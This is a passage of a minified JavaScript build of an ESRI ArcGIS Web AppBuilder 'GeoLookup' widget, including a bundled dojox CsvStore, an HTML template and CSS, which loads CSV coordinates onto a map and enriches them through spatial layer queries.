// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"dojox/data/CsvStore":function(){define("dojo/_base/lang dojo/_base/declare dojo/_base/xhr dojo/_base/kernel dojo/data/util/filter dojo/data/util/simpleFetch".split(" "),function(v,m,q,t,p,A){m=m("dojox.data.CsvStore",null,{constructor:function(a){this._attributes=[];this._attributeIndexes={};this._dataArray=[];this._arrayOfAllItems=[];this._loadFinished=!1;a.url&&(this.url=a.url);this._csvData=a.data;a.label?this.label=a.label:""===this.label&&(this.label=void 0);this._storeProp=
"_csvStore";this._idProp="_csvId";this._features={"dojo.data.api.Read":!0,"dojo.data.api.Identity":!0};this._loadInProgress=!1;this._queuedFetches=[];this.identifier=a.identifier;""===this.identifier?delete this.identifier:this._idMap={};"separator"in a&&(this.separator=a.separator);"urlPreventCache"in a&&(this.urlPreventCache=a.urlPreventCache?!0:!1)},url:"",label:"",identifier:"",separator:",",urlPreventCache:!1,_assertIsItem:function(a){if(!this.isItem(a))throw Error(this.declaredClass+": a function was passed an item argument that was not an item");
},_getIndex:function(a){a=this.getIdentity(a);this.identifier&&(a=this._idMap[a]);return a},getValue:function(a,b,c){this._assertIsItem(a);var e=c;if("string"===typeof b)b=this._attributeIndexes[b],null!=b&&(e=this._dataArray[this._getIndex(a)][b]||c);else throw Error(this.declaredClass+": a function was passed an attribute argument that was not a string");return e},getValues:function(a,b){return(a=this.getValue(a,b))?[a]:[]},getAttributes:function(a){this._assertIsItem(a);var b=[];a=this._dataArray[this._getIndex(a)];
for(var c=0;c<a.length;c++)""!==a[c]&&b.push(this._attributes[c]);return b},hasAttribute:function(a,b){this._assertIsItem(a);if("string"===typeof b)return b=this._attributeIndexes[b],a=this._dataArray[this._getIndex(a)],"undefined"!==typeof b&&b<a.length&&""!==a[b];throw Error(this.declaredClass+": a function was passed an attribute argument that was not a string");},containsValue:function(a,b,c){var e=void 0;"string"===typeof c&&(e=p.patternToRegExp(c,!1));return this._containsValue(a,b,c,e)},_containsValue:function(a,
b,c,e){a=this.getValues(a,b);for(b=0;b<a.length;++b){var d=a[b];if("string"===typeof d&&e)return null!==d.match(e);if(c===d)return!0}return!1},isItem:function(a){if(a&&a[this._storeProp]===this)if(a=a[this._idProp],this.identifier){if(this._dataArray[this._idMap[a]])return!0}else if(0<=a&&a<this._dataArray.length)return!0;return!1},isItemLoaded:function(a){return this.isItem(a)},loadItem:function(a){},getFeatures:function(){return this._features},getLabel:function(a){if(this.label&&this.isItem(a))return this.getValue(a,
this.label)},getLabelAttributes:function(a){return this.label?[this.label]:null},_fetchItems:function(a,b,c){var e=this,d=function(a,c){var d=null;if(a.query){var f,h,d=[],l=a.queryOptions?a.queryOptions.ignoreCase:!1,z={};for(f in a.query)h=a.query[f],"string"===typeof h&&(z[f]=p.patternToRegExp(h,l));for(l=0;l<c.length;++l){var n=!0,m=c[l];for(f in a.query)h=a.query[f],e._containsValue(m,f,h,z[f])||(n=!1);n&&d.push(m)}}else d=c.slice(0,c.length);b(d,a)};if(this._loadFinished)d(a,this._arrayOfAllItems);
else if(""!==this.url)if(this._loadInProgress)this._queuedFetches.push({args:a,filter:d});else{this._loadInProgress=!0;var l=q.get({url:e.url,handleAs:"text",preventCache:e.urlPreventCache});l.addCallback(function(b){try{e._processData(b),d(a,e._arrayOfAllItems),e._handleQueuedFetches()}catch(h){c(h,a)}});l.addErrback(function(b){e._loadInProgress=!1;if(c)c(b,a);else throw b;});var f=null;a.abort&&(f=a.abort);a.abort=function(){var b=l;b&&-1===b.fired&&(b.cancel(),b=null);f&&f.call(a)}}else if(this._csvData)try{this._processData(this._csvData),
this._csvData=null,d(a,this._arrayOfAllItems)}catch(z){c(z,a)}else{var n=Error(this.declaredClass+": No CSV source data was provided as either URL or String data input.");if(c)c(n,a);else throw n;}},close:function(a){},_getArrayOfArraysFromCsvFileContents:function(a){if(v.isString(a)){var b=/^\s+/g,c=/\s+$/g,e=/""/g,d=[],l=this._splitLines(a);for(a=0;a<l.length;++a){var f=l[a];if(0<f.length){for(var f=f.split(this.separator),n=0;n<f.length;){var m=f[n].replace(b,""),h=m.replace(c,""),p=h.charAt(0),
q=h.charAt(h.length-1),t=h.charAt(h.length-2),A=h.charAt(h.length-3);if(2===h.length&&'""'==h)f[n]="";else if('"'==p&&('"'!=q||'"'==q&&'"'==t&&'"'!=A)){if(n+1===f.length)return;f[n]=m+this.separator+f[n+1];f.splice(n+1,1)}else'"'==p&&'"'==q&&(h=h.slice(1,h.length-1),h=h.replace(e,'"')),f[n]=h,n+=1}d.push(f)}}this._attributes=d.shift();for(a=0;a<this._attributes.length;a++)this._attributeIndexes[this._attributes[a]]=a;this._dataArray=d}},_splitLines:function(a){var b=[],c,e="",d=!1;for(c=0;c<a.length;c++){var l=
a.charAt(c);switch(l){case '"':d=!d;e+=l;break;case "\r":d?e+=l:(b.push(e),e="",c<a.length-1&&"\n"==a.charAt(c+1)&&c++);break;case "\n":d?e+=l:(b.push(e),e="");break;default:e+=l}}""!==e&&b.push(e);return b},_processData:function(a){this._getArrayOfArraysFromCsvFileContents(a);this._arrayOfAllItems=[];if(this.identifier&&void 0===this._attributeIndexes[this.identifier])throw Error(this.declaredClass+": Identity specified is not a column header in the data set.");for(a=0;a<this._dataArray.length;a++){var b=
a;this.identifier&&(b=this._dataArray[a][this._attributeIndexes[this.identifier]],this._idMap[b]=a);this._arrayOfAllItems.push(this._createItemFromIdentity(b))}this._loadFinished=!0;this._loadInProgress=!1},_createItemFromIdentity:function(a){var b={};b[this._storeProp]=this;b[this._idProp]=a;return b},getIdentity:function(a){return this.isItem(a)?a[this._idProp]:null},fetchItemByIdentity:function(a){var b,c=a.scope?a.scope:t.global;if(this._loadFinished)b=this._createItemFromIdentity(a.identity),
this.isItem(b)||(b=null),a.onItem&&a.onItem.call(c,b);else{var e=this;if(""!==this.url)this._loadInProgress?this._queuedFetches.push({args:a}):(this._loadInProgress=!0,b=q.get({url:e.url,handleAs:"text"}),b.addCallback(function(b){try{e._processData(b);var d=e._createItemFromIdentity(a.identity);e.isItem(d)||(d=null);a.onItem&&a.onItem.call(c,d);e._handleQueuedFetches()}catch(f){a.onError&&a.onError.call(c,f)}}),b.addErrback(function(b){this._loadInProgress=!1;a.onError&&a.onError.call(c,b)}));else if(this._csvData)try{e._processData(e._csvData),
e._csvData=null,b=e._createItemFromIdentity(a.identity),e.isItem(b)||(b=null),a.onItem&&a.onItem.call(c,b)}catch(d){a.onError&&a.onError.call(c,d)}}},getIdentityAttributes:function(a){return this.identifier?[this.identifier]:null},_handleQueuedFetches:function(){if(0<this._queuedFetches.length){for(var a=0;a<this._queuedFetches.length;a++){var b=this._queuedFetches[a],c=b.filter,e=b.args;c?c(e,this._arrayOfAllItems):this.fetchItemByIdentity(b.args)}this._queuedFetches=[]}}});v.extend(m,A);return m})},
"widgets/GeoLookup/layerQueryDetails":function(){define(["dojo/Evented","dojo/_base/declare","dojo/_base/lang","dojo/_base/array","esri/geometry/geometryEngine"],function(v,m,q,t,p){return m([v],{declaredClass:"layerQueryDetails",layer:null,fields:null,intersectField:null,valueIn:null,valueOut:null,numberOfRequest:0,requestComplete:0,numberOfHits:0,totalRecords:0,currentNumber:0,deferreds:[],complete:!1,hasError:!1,constructor:function(p){m.safeMixin(this,p)},addDeferred:function(m,a){m.then(q.hitch(this,
function(b){b&&t.forEach(a,q.hitch(this,function(a){t.forEach(b.features,q.hitch(this,function(b){p.intersects(a.geometry,b.geometry)&&(t.forEach(this.fields,function(c){b.attributes[c]&&(a.attributes[this.layer.label+"_"+c]=b.attributes[c])},this),a.attributes[this.intersectField]=this.valueIn,a.symbol=this.valueInSym,this.numberOfHits++)}));this.currentNumber++;this.requestComplete++}));this.currentNumber=this.currentNumber;this.requestComplete=this.requestComplete;this.numberOfHits=this.numberOfHits;
this.emit("requestComplete",{layerID:this.layer.id,currentNumber:this.currentNumber,totalRecords:this.totalRecords,intesected:this.numberOfHits,name:this.layer.label});this.isComplete()&&this.emit("complete",{layerID:this.layer.id})}),q.hitch(this,function(a){this.hasError=!0;console.log("error: "+a);this.emit("error",{layerID:this.layer.id});return a}));this.deferreds.push(m)},isComplete:function(){return this.complete=this.numberOfRequest===this.requestComplete?!0:!1}})})},"widgets/GeoLookup/_build-generate_module":function(){define(["dojo/text!./Widget.html",
"dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/GeoLookup/Widget.html":'\x3cdiv style\x3d"width:100%;height:100%;overflow-y:auto;"\x3e\r\n\r\n   \x3c!-- \x3cdiv data-dojo-type\x3d"dijit/layout/ContentPane" style\x3d"height:100%;width:100%"\x3e --\x3e\r\n        \x3cdiv class\x3d"widgetDescription" data-dojo-attach-point\x3d"widgetDescription"\x3e\x3c/div\x3e\r\n        \x3cform data-dojo-attach-point\x3d"inputForm"\x3e\r\n        \x3cdiv class\x3d"divCheckPlot"\x3e\r\n        \t\x3ctable\x3e\r\n        \t\t\x3ctr\x3e\r\n        \t\t\t\x3ctd class\x3d"optionStyle"\x3e\x3cinput type\x3d"checkbox" id\x3d"chkboxPlotOnly" data-dojo-attach-point\x3d"chkboxPlotOnly"\x3e\x3clabel\x3e${nls.plotOnly}\x3c/label\x3e\x3c/td\x3e\r\n        \t\t\x3c/tr\x3e\r\n        \t\t\x3ctr\x3e\r\n        \t\t\t\x3ctd class\x3d"optionStyle"\x3e\r\n\t\t        \t\t\x3clabel class\x3d"labelPad"\x3e${nls.projectionChoice}\x3c/label\x3e\r\n\t\t        \t\t\x3cinput type\x3d"radio" class\x3d"jimu-radio-btn" name\x3d"rdProjection" id\x3d"rdProjectionLat" data-dojo-attach-point\x3d"rdProjection" value\x3d"latlon" checked\x3e\x3clabel class\x3d"labelPad"\x3e${nls.projectionLat}\x3c/label\x3e\r\n\t\t        \t\t\x3cinput type\x3d"radio" class\x3d"jimu-radio-btn" name\x3d"rdProjection" id\x3d"rdProjectionMap" data-dojo-attach-point\x3d"rdProjection" value\x3d"map"\x3e\x3clabel\x3e${nls.projectionMap}\x3c/label\x3e\r\n        \t\t\t\x3c/td\x3e\r\n        \t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3ctable border\x3d0\x3e\r\n\t\t\t\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\t\t\t\x3ctd class\x3d"tdClearButton" nowrap\x3e\x3cdiv class\x3d"clear-CSVresult" data-dojo-attach-point\x3d"clearResultsBtn" data-dojo-attach-event\x3d"click:clearCSVResults"\x3e${nls.clearResults}\x3c/div\x3e\x3c/td\x3e\r\n\t\t\t\t\t        \t\x3ctd class\x3d"tdDownloadButton" nowrap\x3e\x3cdiv class\x3d"download-CSVresult" data-dojo-attach-point\x3d"downloadResultsBtn" data-dojo-attach-event\x3d"click:downloadCSVResults"\x3e${nls.downloadResults}\x3c/div\x3e\x3c/td\x3e\r\n\t\t\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\t\x3c/table\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\r\n\t\t        \x3c/tr\x3e\r\n        \t\x3c/table\x3e\r\n\x3c!--\r\n        \t\x3cdiv class\x3d"plotChoice"\x3e\x3cinput type\x3d"checkbox" id\x3d"chkboxPlotOnly" data-dojo-attach-point\x3d"chkboxPlotOnly"\x3e\x3clabel\x3e${nls.plotOnly}\x3c/label\x3e\x3c/div\x3e\r\n        \t\x3cdiv class\x3d"projectionChoice"\x3e\r\n        \t\t\x3clabel class\x3d"labelPad"\x3e${nls.projectionChoice}\x3c/label\x3e\r\n        \t\t\x3cinput type\x3d"radio" name\x3d"rdProjection" id\x3d"rdProjectionLat" data-dojo-attach-point\x3d"rdProjection" value\x3d"latlon" checked\x3e\x3clabel class\x3d"labelPad"\x3e${nls.projectionLat}\x3c/label\x3e\r\n        \t\t\x3cinput type\x3d"radio" name\x3d"rdProjection" id\x3d"rdProjectionMap" data-dojo-attach-point\x3d"rdProjection" value\x3d"map"\x3e\x3clabel\x3e${nls.projectionMap}\x3c/label\x3e\r\n        \t\x3c/div\x3e\r\n--\x3e\r\n        \x3c/div\x3e\r\n        \x3ctable data-dojo-attach-point\x3d"actionButtonsContainer" cellspacing\x3d"0" class\x3d"tblActionContainer"\x3e\r\n        \x3ctr\x3e\r\n        \t\x3ctd width\x3d"100%" class\x3d"tdCSVButton"\x3e\r\n        \t\t\x3cinput type\x3d"file" id\x3d"csvFileInput" data-dojo-attach-point\x3d"csvFileInput" data-dojo-attach-event\x3d"change:fileSelected" accept\x3d".csv"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"jimu-btn hide" data-dojo-attach-point\x3d"showFileDialogBtn" data-dojo-attach-event\x3d"click:showFileDialog"\x3e${nls.selectCSV}\x3c/div\x3e\r\n\t\t\t\x3c/td\x3e\r\n\t\t\x3c/tr\x3e\r\n        \x3c/table\x3e\r\n        \x3c/form\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"results" class\x3d"hide"\x3e\r\n        \t\x3cdiv class\x3d"results-header"\x3e${nls.messages}\x3c/div\x3e\r\n            \x3ctable class\x3d"widgets-results-table" data-dojo-attach-point\x3d"widgetsResultsTable" cellspacing\x3d"0"\x3e\r\n                \x3ctbody data-dojo-attach-point\x3d"widgetsResultsTableBody"\x3e\r\n\r\n                    \x3ctr class\x3d"controls"\x3e\r\n\r\n                        \x3ctd class\x3d"tdProcessing"\x3e\r\n                            \x3cdiv data-dojo-attach-point\x3d"resultsLoadingImage" id\x3d"resultsLoadingImage" class\x3d"status processing" /\x3e\r\n                        \x3c/td\x3e\r\n                        \x3ctd\x3e\r\n                            \x3cdiv class\x3d"result-text" data-dojo-attach-point\x3d"resultsLoading"\x3e${nls.loadingCSV}\x3c/div\x3e\r\n                        \x3c/td\x3e\r\n                    \x3c/tr\x3e\r\n\r\n                    \x3ctr class\x3d"controls"\x3e\r\n\r\n                        \x3ctd class\x3d"tdProcessing"\x3e\r\n                            \x3cdiv data-dojo-attach-point\x3d"resultsPlottingImage" id\x3d"resultsPlottingImage" class\x3d"status processing" /\x3e\r\n\r\n                        \x3c/td\x3e\r\n                        \x3ctd\x3e\r\n                            \x3cdiv class\x3d"result-text" data-dojo-attach-point\x3d"resultsPlotting"\x3e${nls.plottingRows}\x3c/div\x3e\r\n                        \x3c/td\x3e\r\n                    \x3c/tr\x3e\r\n\r\n                \x3c/tbody\x3e\r\n\r\n            \x3c/table\x3e\r\n            \x3cdiv class\x3d"errorLink" data-dojo-attach-point\x3d"enrichErrors" data-dojo-attach-event\x3d"click:showErrorTable"\x3e\x3c/div\x3e\r\n            \x3cdiv class\x3d"hide errorList" id\x3d"enrichErrorsList" data-dojo-attach-point\x3d"enrichErrorsList"\x3e\x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3c!--  \x3c/div\x3e--\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"loading" data-dojo-type\x3d"jimu/dijit/LoadingIndicator" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n   \x3c!-- \x3c/div\x3e --\x3e\r\n\x3c/div\x3e',
"url:widgets/GeoLookup/css/style.css":'.solutions-widget-geolookup .widgetDescription {text-align: left; color: #66696C; font-family: proxima-nova; font-style: normal; margin: 0px 0px 20px 0px; font-size: 14px;}.solutions-widget-geolookup .uploadBox {margin: 30px 0 15px 0; float: left;}.solutions-widget-geolookup .hide {display: none;}.solutions-widget-geolookup .fileInputNonHTML5 {position: fixed;}.solutions-widget-geolookup .fileInputHTML5 {position: fixed; width: 0px; height: 0px;}.solutions-widget-geolookup .divCheckPlot {color: #686868; font-family: proxima-nova; font-style: normal; font-size: 12px; padding-bottom: 10px; width: 100%; position: relative;}.solutions-widget-geolookup .plotChoice {position: absolute; left: 0px; top: 0px; width: 35%;}.solutions-widget-geolookup .projectionChoice {text-align: right; width: 65%; position: absolute; right: 0px; top: 0px;}.solutions-widget-geolookup .labelPad {padding-right: 5px;}.solutions-widget-geolookup .widgets-results-table {margin: 1px;}.solutions-widget-geolookup .tblActionContainer {width: 100%; padding-bottom: 15px;}.solutions-widget-geolookup .optionStyle {padding-bottom: 5px;}.solutions-widget-geolookup .tdCSVButton {width: 100%;}.solutions-widget-geolookup .tdDownloadButton {width: 25%;}.solutions-widget-geolookup .tdClearButton {width: 25%;}.solutions-widget-geolookup .clear-CSVresult {color: #51b1fe; font-family: proxima-nova; font-style: normal; margin: 0px 0px 0px 0px; font-size: 14px; cursor:pointer;}.solutions-widget-geolookup .download-CSVresult {color: #51b1fe; font-family: proxima-nova; font-style: normal; margin: 0px 15px 0px 15px; font-size: 14px; cursor:pointer;} .solutions-widget-geolookup .controls {width: 100%; height: 42px; vertical-align: middle; padding-top: 0px; padding-bottom: 0px; margin-bottom: 0px; margin-top: 0px; font-size:12px;}.solutions-widget-geolookup .status {background-repeat: no-repeat; background-position: left; width: 20px;}.solutions-widget-geolookup .processing {content: url("./images/processing.gif");}.solutions-widget-geolookup .processing:before {content: url("./images/processing.gif");}.solutions-widget-geolookup .tdProcessing {width: 30px; text-align: left;}.solutions-widget-geolookup .complete {content: url("./images/complete.png");}.solutions-widget-geolookup .complete:before {content: url("./images/complete.png");}.solutions-widget-geolookup .error {content: url("./images/x_symbol_red.png");}.solutions-widget-geolookup .error:before {content: url("./images/x_symbol_red.png");}.solutions-widget-geolookup .bypass {content: url("");}.solutions-widget-geolookup .results-header {color: #66696C; font-family: proxima-nova; font-style: Semibold; font-size: 14px; padding-bottom: 0px;}.solutions-widget-geolookup .result-text {color: #686868; font-family: proxima-nova; font-style: normal; font-size: 12px;}.solutions-widget-geolookup .errorLink {color: #0000FF; cursor:pointer; font-family: proxima-nova; font-style: normal; font-size: 12px;}.solutions-widget-geolookup .errorList {color: #686868; font-family: proxima-nova; font-style: normal; font-size: 12px;}',
"*now":function(v){v(['dojo/i18n!*preload*widgets/GeoLookup/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dijit/_WidgetsInTemplateMixin jimu/BaseWidget dojo/dom dojo/on dojo/sniff dojo/_base/html dojo/_base/lang dojo/_base/array dojo/string dojo/dom-class dojo/dom-construct dojo/dom-style dojox/data/CsvStore esri/geometry/webMercatorUtils esri/layers/FeatureLayer esri/geometry/Multipoint esri/geometry/Point esri/InfoTemplate esri/tasks/query esri/tasks/QueryTask esri/SpatialReference esri/symbols/jsonUtils esri/renderers/UniqueValueRenderer jimu/dijit/Message jimu/exportUtils jimu/utils ./layerQueryDetails".split(" "),function(v,
m,q,t,p,A,a,b,c,e,d,l,f,n,z,h,D,E,I,F,J,K,G,L,x,B,w,M){return v([q,m],{baseClass:"solutions-widget-geolookup",csvStore:null,layerLoaded:!1,lookupLayersFieldNames:[],lookupLayersFields:[],combinedFields:[],latField:null,longField:null,renderer:null,srWebMerc:null,syncLayers:null,enrichFilter:null,enrichResultsProg:{},enrichResultsText:{},errorList:null,postCreate:function(){this.inherited(arguments);d.add(this.downloadResultsBtn,"hide")},startup:function(){this.inherited(arguments);this.loading.show();
a.place(a.toDom(this.nls.description),this.widgetDescription);this._buildRenderer();if(w.file.supportHTML5()){var g=t.byId(this.id);this.own(p(g,"dragover",function(a){a.preventDefault()}));this.own(p(g,"dragenter",function(a){a.preventDefault()}));this.own(p(g,"drop",b.hitch(this,this._handleCSVDrop)))}this.srWebMerc=new K({wkid:102100});w.file.supportHTML5()||A("safari")||!w.file.isEnabledFlash()?(d.add(this.csvFileInput,"fileInputHTML5"),d.remove(this.showFileDialogBtn,"hide")):w.file.loadFileAPI().then(b.hitch(this,
function(){console.log("loading FileAPI");d.add(this.csvFileInput,"fileInputNonHTML5, js-fileapi-wrapper")}));this._initalizeLookupLayers();c.forEach(this.config.enrichLayers,function(a){var b=a.id,g=a.id+"_prog",c=l.toDom("\x3ctr class\x3d'controls'\x3e\x3ctd\x3e\x3cdiv id\x3d'"+g+"' class\x3d'status processing' /\x3e\x3c/td\x3e\x3ctd\x3e\x3cdiv id\x3d'"+b+"' class\x3d'result-text' \x3e\x3c/div\x3e\x3c/td\x3e\x3c/tr\x3e");l.place(c,this.widgetsResultsTableBody);this.enrichResultsProg[b]=t.byId(g);
this.enrichResultsText[b]=t.byId(b);this.enrichResultsText[b].innerHTML=e.substitute(this.nls.results.recordsEnriched,{0:0,1:0,2:0,3:a.label})},this);d.add(this.clearResultsBtn,"jimu-state-disabled");this.loading.hide()},_buildRenderer:function(){this.symIn=G.fromJson(this.config.SymbolWithin);this.symOut=G.fromJson(this.config.SymbolOutside);this.renderer=new L(this.symOut,this.config.intersectField);this.renderer.addValue(this.config.valueIn,this.symIn);this.renderer.addValue(this.config.valueOut,
this.symOut)},_initalizeLookupLayers:function(){this.lookupLayersField=[];this.lookupLayersFieldNames=[];var a,b;c.forEach(this.config.enrichLayers,function(g){a=c.map(g.fields,function(a){return a.fieldName});b=c.map(g.fields,function(a){return a.label});c.forEach(a,function(c){var d=a.indexOf(c),k={name:null,alias:null,type:"esriFieldTypeString",editable:!0,domain:null};k.name=g.label+"_"+c;k.alias=g.label+"_"+b[d];this.lookupLayersFieldNames.push(k.name);this.lookupLayersFields.push(k)},this)},
this)},fileSelected:function(){w.file.supportHTML5()?this._processFiles(this.csvFileInput.files):w.file.supportFileAPI()?this._processFiles(window.FileAPI.getFiles(this.csvFileInput)):console.log("no file handler support !");this.csvFileInput.value=null;d.add(this.downloadResultsBtn,"hide")},_handleCSVDrop:function(a){a.preventDefault();a=a.dataTransfer;d.contains(this.showFileDialogBtn,"jimu-state-disabled")||(d.add(this.downloadResultsBtn,"hide"),this._processFiles(a.files))},_processFiles:function(a){d.add(this.showFileDialogBtn,
"jimu-state-disabled");this._resetResults();0<a.length&&(a=a[0],-1!==a.name.indexOf(".csv")?a?this.handleCSV(a):(x({message:this.nls.error.fileIssue}),d.remove(this.showFileDialogBtn,"jimu-state-disabled"),this.clearCSVResults()):(new x({message:this.nls.error.notCSVFile}),d.remove(this.showFileDialogBtn,"jimu-state-disabled"),this.clearCSVResults()))},showFileDialog:function(){d.contains(this.showFileDialogBtn,"jimu-state-disabled")||this.csvFileInput.click()},handleCSV:function(a){if(w.file.supportHTML5()){var g=
new FileReader;g.onload=b.hitch(this,function(){this._processCSVData(g.result)});g.readAsText(a)}else window.FileAPI.readAsText(a,b.hitch(this,function(a){"load"===a.type&&this._processCSVData(a.result)}))},_processCSVData:function(a){if(2<a.length){var c=a.indexOf("\n"),g=b.trim(a.substr(0,c)),f=a.replace(g,"");""!==g&&2<f.length?(console.log(c),c=this._getSeparator(g),this.csvStore=new n({data:a,separator:c}),this.csvStore.fetch({onComplete:b.hitch(this,this._csvReadComplete),onError:b.hitch(this,
function(a){d.remove(this.showFileDialogBtn,"jimu-state-disabled");var b=e.substitute(this.nls.error.fetchingCSV,{0:a.message});x({message:b});console.error(b,a)})})):(new x({message:this.nls.error.CSVNoRecords}),d.remove(this.showFileDialogBtn,"jimu-state-disabled"),this.clearCSVResults())}else new x({message:this.nls.error.CSVEmptyFile}),d.remove(this.showFileDialogBtn,"jimu-state-disabled"),this.clearCSVResults()},_csvReadComplete:function(a){if(a.length<=parseInt(this.config.maxRowCount,10)){var g=
a.length.toString();d.remove(this.results,"hide");this.resultsLoading.innerHTML=e.substitute(this.nls.results.csvLoaded,{0:g});d.replace(this.resultsLoadingImage,"complete","processing");var r=1,C=this._generateFeatureCollectionTemplateCSV(this.csvStore,a),y=this._generateDefaultPopupInfo(C),y=new I(this._buildInfoTemplate(y)),H="latlon";c.forEach(this.inputForm.rdProjection,b.hitch(this,function(a){a.checked&&(H=a.value)}));this.longField=this.latField=null;c.some(this.csvFields,function(a){var b;
b=c.indexOf(this.config.latFields,a.toLowerCase());-1!==b&&(this.latField=a);b=c.indexOf(this.config.longFields,a.toLowerCase());-1!==b&&(this.longField=a);return this.latField&&this.longField?!0:!1},this);if(null===this.latField||null===this.longField)x({message:this.nls.error.invalidCoord}),this.clearCSVResults();else{var l=0;this.errorList=[];c.forEach(a,function(a,b){var d=!1,k={};c.forEach(this.combinedFields,function(b){var c=Number(this.csvStore.getValue(a,b));k[b]=isNaN(c)?this.csvStore.getValue(a,
b):c},this);k.__OBJECTID=r;k[this.config.intersectField]=this.config.valueOut;r++;var f=0,y=0;isNaN(k[this.latField])||isNaN(k[this.longField])?(d=!0,l+=1,this.errorList.push(parseInt(a._csvId,10)+2),this.enrichErrors.innerHTML=e.substitute(this.nls.results.recordsError,{0:l})):(f=parseFloat(k[this.latField]),y=parseFloat(k[this.longField]));d||(d={geometry:("latlon"===H?new E(z.lngLatToXY(y,f),this.srWebMerc):new E(y,f,this.srWebMerc)).toJson(),attributes:k},C.featureSet.features.push(d),this.resultsPlotting.innerHTML=
e.substitute(this.nls.results.recordsPlotted,{0:(b-l+1).toString(),1:g}))},this);this.layerLoaded&&this.map.removeLayer(this.featureLayer);this.featureLayer=new h(C,{infoTemplate:y,id:"csvLayer",name:"CSV Layer"});this.featureLayer.setRenderer(this.renderer);d.replace(this.resultsPlottingImage,"complete","processing");d.remove(this.clearResultsBtn,"jimu-state-disabled");this._zoomToData(this.featureLayer);var u;if(this.chkboxPlotOnly.checked){for(u in this.enrichResultsText)this.enrichResultsText.hasOwnProperty(u)&&
(this.enrichResultsText[u].innerHTML="");for(u in this.enrichResultsProg)this.enrichResultsProg.hasOwnProperty(u)&&f.set(this.enrichResultsProg[u],"display","none")}else for(u in this._enrichData(this.featureLayer,this.config.enrichLayers),this.enrichResultsProg)this.enrichResultsProg.hasOwnProperty(u)&&f.set(this.enrichResultsProg[u],"display","block")}}else new x({message:e.substitute(this.nls.error.tooManyRecords,{0:this.config.maxRowCount})}),this.clearCSVResults()},_enrichData:function(a,d){this.syncLayers=
[];var g=0,k=1,e=[];e[g]=[];c.forEach(a.graphics,b.hitch(this,function(b){k>=parseInt(this.config.cacheNumber,10)?(e[g].push(b),a.graphics.length>(g+1)*parseInt(this.config.cacheNumber,10)&&(g++,k=1,e[g]=[])):(e[g].push(b),k++)}));c.forEach(d,function(g){var d=c.map(g.fields,function(a){return a.fieldName}),k=new M({layer:g,numberOfRequest:a.graphics.length,totalRecords:a.graphics.length,numberOfHits:0,fields:d,intersectField:this.config.intersectField,valueIn:this.config.valueIn,valueOut:this.config.valueOut,
valueInSym:this.symIn,valueOutSym:this.symOut});this.own(p(k,"complete",b.hitch(this,this._syncComplete)));this.own(p(k,"requestComplete",b.hitch(this,this._requestComplete)));this.own(p(k,"error",b.hitch(this,this._deferredErrorCallback)));this.syncLayers.push(k);this.queryCallback(e,0,g,d,k)},this)},queryCallback:function(a,d,e,f,h){var g,k=new D(this.map.spatialReference);c.forEach(a[d],function(a){(a=a.geometry)&&k.addPoint({x:a.x,y:a.y})});var l=new J(e.url);if(0===d){var r=new F;r.returnGeometry=
!0;r.outFields=["*"];r.geometry=k;g=l.execute(r,b.hitch(this,this.queryCallback(a,d+1,e,f,h)),b.hitch(this,this.queryErrorback(e)));h.addDeferred(g,a[d]);this.featureLayer.redraw()}else return function(c){if(a.length>d){var r=new F;r.returnGeometry=!0;r.outFields=["*"];r.geometry=k;g=l.execute(r,b.hitch(this,this.queryCallback(a,d+1,e,f,h)),b.hitch(this,this.queryErrorback(e)));h.addDeferred(g,a[d]);this.featureLayer.redraw()}return{results:c}}},queryErrorback:function(a){return b.hitch(this,function(b){this.enrichResultsProg.hasOwnProperty(a.id)&&
(d.replace(this.enrichResultsProg[a.id],"error","complete"),d.replace(this.enrichResultsProg[a.id],"error","processing"));console.log(b);return b})},_deferredErrorCallback:function(a){this.enrichResultsProg.hasOwnProperty(a.layerID)&&(d.replace(this.enrichResultsProg[a.layerID],"error","complete"),d.replace(this.enrichResultsProg[a.layerID],"error","processing"))},_syncComplete:function(a){d.replace(this.enrichResultsProg[a.layerID],"complete","processing");c.some(this.syncLayers,function(a){return!a.isComplete()},
this)||(this.featureLayer.redraw(),d.remove(this.showFileDialogBtn,"jimu-state-disabled"),d.remove(this.downloadResultsBtn,"hide"))},_requestComplete:function(a){this.enrichResultsText[a.layerID].innerHTML=e.substitute(this.nls.results.recordsEnriched,{0:a.currentNumber,1:a.totalRecords,2:a.intesected,3:a.name});this.featureLayer.redraw()},_resetResults:function(){d.replace(this.resultsLoadingImage,"processing","complete");d.replace(this.resultsPlottingImage,"processing","complete");var a,k="";for(a in this.enrichResultsProg)this.enrichResultsProg.hasOwnProperty(a)&&
(d.replace(this.enrichResultsProg[a],"processing","error"),d.replace(this.enrichResultsProg[a],"processing","complete"));var f=b.hitch(this,function(b){b.id===a&&(h=b)});for(a in this.enrichResultsProg)if(this.enrichResultsText.hasOwnProperty(a)){var h;c.forEach(this.config.enrichLayers,f);h&&(k=h.label);this.enrichResultsText[a].innerHTML=e.substitute(this.nls.results.recordsEnriched,{0:0,1:0,2:0,3:k})}this.resultsLoading.innerHTML=e.substitute(this.nls.results.csvLoaded,{0:0});this.enrichErrors.innerHTML=
